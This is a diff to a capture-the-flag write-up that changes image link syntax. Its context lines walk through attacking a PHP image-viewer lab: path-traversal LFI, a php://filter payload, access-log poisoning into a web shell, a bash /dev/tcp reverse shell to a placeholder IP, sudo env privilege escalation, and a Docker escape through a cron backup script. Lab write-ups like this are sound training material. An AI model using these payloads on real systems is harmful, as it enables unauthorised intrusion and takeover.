@@ -7,7 +7,8 @@ I made this website for viewing cat and dog images with PHP. If you're feeling 
 
 # Solution
 So, lets start with a basic nmap
-![[images/baseScan.png]]
+
+![basic nmap scan](images/baseScan.png)
 
 In the site, we found a simple php website the ask us to choose if we wanna see dog or cat.
 Choosing anyone it will redirect to
@@ -16,12 +17,13 @@ or
 http://$IP/?view=cat
 
 If we try to change the view for something like /etc/passwd, we receive
-![[images/index.png]]
+
+![index](images/index.png)
 
 but, if we put something like
 http://$IP/?view=dog/../../../../../../../../../etc/passwd
 
-![[images/lfiFailed.png]]
+![failed lfi attempt](images/lfiFailed.png)
 
 uhul! were going to somewhere!
 i tried null byte but i wasnt able to bypass the .php filter (note that try to open /etc/passwd.php)
@@ -33,11 +35,11 @@ basically, our payload will be:
 php://filter/convert.base64-encode/resource=dog/../../../../var/www/html/index
 (ill send over burp to be easier to analyze)
 
-![[images/indexBase64.png]]
+![index.php in base64](images/indexBase64.png)
 
 now, lets see this code.
 
-![[images/sourceCode.png]]
+![index.php source code](images/sourceCode.png)
 
 if we take a closer look at the $ext line, we can define the extension.
 So, we can open any file (passing their extension or simple '').
@@ -46,7 +48,8 @@ So, PHP + LFI, sound like a log poisoning!
 Lets try to access the access and error.log
 
 we can access the access.log!
-![[images/accessLog.png]]
+
+![access log](images/accessLog.png)
 
 ## Log poisoning
 Whats log poisoning?
@@ -61,18 +64,21 @@ So, log poisoning is basically put a php code in there, making and RCE!
 The most common poison (and the one that were going to do) is by turning the log into a web shell!
 Its probably the most common web shell php payload!
 In the log, we can see that the User-Agent is stored.
-![[images/accessLogUserAgent.png]]
+
+![User-Agent in access.log](images/accessLogUserAgent.png)
 So, lets try changing our user agent (mozilla etc etc) to our code!
 
 The request will be this one
-![[images/logPoisoning.png]]
+
+![log poisoning](images/logPoisoning.png)
 
 Then we can try pass the command with the cmd parameter!
 (i changed the user-agent just so i dont get lost, itll also help to not execute the command a lot of times)
 For example, now, calling
 /?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=id
 We get this
-![[images/logPoisoningPOC.png]]
+
+![Log poisoning POC](images/logPoisoningPOC.png)
 
 ok! in this point, we can try a rev shell!
 i tried with bash, sh, python
@@ -89,17 +95,21 @@ executing this command and opening the same port with nc, we got a rev shell!
 
 ## Post exploit!
 the first thing we found, was the first flag!
-![[images/firstFlag.png]]
+
+![first flag](images/firstFlag.png)
 
 with this shell, we can find the second flag too!
 its just in another directory
-![[images/secondFlag.png]]
+
+![second flag](images/secondFlag.png)
 
 using sudo -l, it shows that we can run env as root!
 So, looking in GTFO bins, it shows that env can create a shell!
 We can turn into root by simple running
 	sudo /usr/bin/env /bin/bash
-![[images/privEsc.png]]
+	
+![privilege escalation](images/privEsc.png)
+
 And we can get the third flag now! (i forgot the screenshot but just go to the root dir)
 
 ## Docker escape!
@@ -110,7 +120,8 @@ So, basically, we first need to now if this IS a docker.
 a docker generally well have a .dockerenv in root. Another way to seek that is if we saw that the machine has just a few things (binaries, directories and etc). For example, youll may notice that binaries that are common on linux, isnt on the machine.
 
 In our case, we can see a .dockerenv
-![[images/dockerenv.png]]
+
+![.dockerenv file](images/dockerenv.png)
 
 (tbh, the -l flag can be ignored)
 
@@ -123,8 +134,9 @@ i did the most common rev shell:
 bash -i >& /dev/tcp/<YOUR-IP>/<YOUR-PORT> 0>&1
 ```
 
-![[images/changeBackupScript.png]]
+![changing backup script](images/changeBackupScript.png)
 
 and now just wait!
 with my netcat i got the rev shell!
-![[images/lastFlag.png]]
+
+![last flag](images/lastFlag.png)
